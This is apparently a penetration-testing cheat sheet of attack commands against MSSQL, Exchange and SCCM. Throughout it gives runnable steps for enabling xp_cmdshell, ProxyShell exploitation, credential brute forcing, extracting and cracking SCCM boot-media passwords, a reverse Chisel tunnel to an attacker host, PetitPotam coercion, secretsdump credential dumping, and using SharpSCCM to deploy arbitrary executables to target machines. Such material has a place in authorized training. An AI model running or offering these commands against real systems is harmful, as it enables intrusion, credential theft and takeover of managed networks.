title: MSSQL, Exchange, and SCCM Attacks
html:
MSSQL, Exchange, and SCCM Attacks

MSSQL

Connecting to an MSSQL database server

impacket-mssqlclient <User>@<IP>

Enumeration of server logins

SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin
FROM master.sys.server_principals r
LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid
WHERE r.type IN ('S','E','X','U','G');

Enumeration of databases

SELECT a.name AS 'database', b.name AS 'owner', is_trustworthy_on
FROM sys.databases a
JOIN sys.server_principals b ON a.owner_sid = b.sid;

Login impersonation

SELECT name FROM sys.server_permissions
JOIN sys.server_principals
ON grantor_principal_id = principal_id
WHERE permission_name = 'IMPERSONATE';

UNC Path injection

EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';

Enabling xp_cmdshell and subsequent command execution

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'ipconfig';

Enable OLE automation stored procedure

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'ole automation procedures', 1;
RECONFIGURE;

Enumeration of linked database servers

EXEC sp_linkedservers;

Execution of SQL SELECT operations on a linked database server

SELECT * FROM OPENQUERY(<DATABASE>, 'SELECT name, database_id, create_date FROM sys.databases');

Execution of SQL statements via OPENQUERY on a linked database server

SELECT * FROM OPENQUERY(<DATABASE>, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

Exchange

Exchange version enumeration

curl https://<TARGET_IP>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version

Use NTLM Theft tool to generate HTML and send to target.

python3 ntlm_theft.py -g htm -s <TARGET_IP> -f <USER>

Use ProxyShell exploit to target a specific email address.

python3 proxyshell.py -u <URL> -e <EMAIL>

Generate username variations from a list of names using Username Anarchy.

./username-anarchy --input-file ./names.txt

Use Ruler to brute force credentials against a domain.

./ruler-linux64 --domain <DOMAIN> --insecure brute --users users.txt --passwords password.txt --verbose

SCCM

Run PXEThief to enumerate target system.

python .\pxethief.py 2 <TARGET_IP>

Download a file from a TFTP server.

tftp -i <TARGET_IP> GET "\SMSTemp\<TIMESTAMP>.{<GUID>}.boot.var" "<TIMESTAMP>.{<GUID>}.boot.var"

Process the boot variable file with PXEThief.

python .\pxethief.py 5 '.\<TIMESTAMP>.{<GUID>}.boot.var'

Use Hashcat to crack a hash using the RockYou wordlist.

hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt

Use PXEThief to extract password from boot variable file.

python .\pxethief.py 3 '.\<TIMESTAMP>.{<GUID>}.boot.var' "<PASSWORD>"

Start Chisel server with reverse port forwarding.

./chisel server --reverse

Connect Chisel client to the Chisel server for reverse tunneling.

.\chisel.exe client <VPN_IP>:8080 R:socks

Use SCCMHunter to find SCCM-related information.

proxychains4 -q python3 sccmhunter.py find -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP>

Show all information gathered by SCCMHunter.

python3 sccmhunter.py show -all

Enumerate SMB information using SCCMHunter and save results.

proxychains4 -q python3 sccmhunter.py smb -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP> -save

Use SCCMHunter for administrative tasks.

proxychains4 -q python3 sccmhunter.py admin -u <USER> -p <PASSWORD> -ip <TARGET_IP>

Use SCCMHunter for administrative tasks with additional parameters.

proxychains4 -q python3 sccmhunter.py admin -u <USER> -p '<PASSWORD>' -ip <TARGET_IP> -au '<COMPUTER_NAME>' -ap <COMPUTER_PASSWORD>

Execute PetitPotam attack using proxychains.

proxychains4 -f <PROXY_CONF> python3 PetitPotam.py -u <USER> -p '<PASSWORD>' -d '<DOMAIN>' <PROXY_IP> <TARGET_IP>

Connect to MSSQL server using proxychains and mssqlclient with Windows authentication and no password.

proxychains4 -q -f <PROXY_CONF> mssqlclient.py '<USER>'@<TARGET_IP> -windows-auth -no-pass

Get domain user properties using PowerShell.

Get-DomainUser <USER> -Properties objectsid

Dump secrets from a target using proxychains and secretsdump with no password.

proxychains4 -q -f <PROXY_CONF> secretsdump.py '<USER>'@<TARGET_IP> -no-pass

Use SCCMHunter for administrative tasks with NTLM hash authentication.

proxychains4 -q -f <PROXY_CONF> python3 sccmhunter.py admin -u '<USER>' -p <NTLM_HASH> -ip <TARGET_IP>

Enumerate DPAPI using SCCMHunter with WMI.

proxychains4 -q python3 sccmhunter.py dpapi -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP> -target <TARGET_IP> -wmi

Add a computer to the domain using proxychains and addcomputer.py.

proxychains4 -q addcomputer.py -computer-name '<COMPUTER_NAME>' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>':'<PASSWORD>'

Connect to a remote desktop using FreeRDP.

xfreerdp /u:<USER> /p:'<PASSWORD>' /d:<DOMAIN> /v:<TARGET_IP> /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache

Execute Inveigh for network sniffing and exploitation.

.\Inveigh.exe

Invoke client push installation using SharpSCCM.

.\SharpSCCM.exe invoke client-push -t <TARGET_IP>

Get devices from SCCM server using SharpSCCM.

.\SharpSCCM.exe get devices -n <SCCM_SERVER> -sms <TARGET_IP>

Get class instances from SCCM server using SharpSCCM.

.\SharpSCCM.exe get class-instances <CLASS_NAME> -p <PROPERTY1> -p <PROPERTY2> -p <PROPERTY3> -p <PROPERTY4> -sms <TARGET_IP>

Get primary users from SCCM server using SharpSCCM.

.\SharpSCCM.exe get primary-users -u <USER> -sms <TARGET_IP>

Get devices with specific filter conditions from SCCM server using SharpSCCM.

.\SharpSCCM.exe get devices -w "<FILTER_CONDITION>" -sms <TARGET_IP>

Create a new application in SCCM using SharpSCCM.

.\SharpSCCM.exe new application -s -n <APPLICATION_NAME> -p <PATH_TO_EXECUTABLE> -sms <TARGET_IP>

Create a new collection in SCCM using SharpSCCM.

.\SharpSCCM.exe new collection -n "<COLLECTION_NAME>" -t device -sms <TARGET_IP>

Add a new member to a collection in SCCM using SharpSCCM.

.\SharpSCCM.exe new collection-member -d <DEVICE_NAME> -n "<COLLECTION_NAME>" -t device -sms <TARGET_IP>

Create a new deployment in SCCM using SharpSCCM.

.\SharpSCCM.exe new deployment -a <APPLICATION_NAME> -c "<COLLECTION_NAME>" -sms <TARGET_IP>

Invoke update for a collection in SCCM using SharpSCCM.

.\SharpSCCM.exe invoke update -n "<COLLECTION_NAME>" -sms <TARGET_IP>
